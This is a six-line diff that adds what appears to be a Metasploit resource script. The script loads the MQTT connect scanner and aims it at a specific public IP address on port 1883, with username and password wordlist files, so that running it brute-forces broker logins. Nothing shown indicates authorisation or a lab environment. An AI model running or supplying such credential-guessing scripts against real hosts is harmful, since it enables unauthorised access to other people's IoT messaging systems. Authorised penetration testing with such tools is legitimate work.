@@ -1,0 +1,6 @@
+use auxiliary/scanner/mqtt/connect
+         set rhosts 116.74.179.141 
+         set rport 1883
+         set USER_FILE src/users.txt
+         set PASS_FILE src/pass.txt
+         run
